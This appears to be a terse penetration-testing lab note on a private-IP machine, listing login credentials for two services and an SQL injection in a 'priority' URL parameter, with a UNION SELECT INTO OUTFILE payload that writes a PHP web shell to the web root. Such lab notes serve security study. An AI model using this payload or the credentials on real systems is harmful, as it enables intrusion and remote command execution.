_____

> [!info]
IP=192.168.211.147

# 50080

/cloud
- admin:admin

# 17445

issue_user:ManagementInsideOld797


## SQLi

![Captura](../../../../assets/images/reference/dc3181bfca78217b7998.png)

```bash
http://192.168.211.147:17445/issue/checkByPriority?priority=EXPLOIT
```

```sql
' union select '<?php echo system($_REQUEST["cmd"]); ?>' into outfile '/srv/http/cmd.php' -- -
```

![Captura](../../../../assets/images/reference/89d62db9aadb351dcb10.png)


![Captura](../../../../assets/images/reference/97d48468dedd276722b9.png)
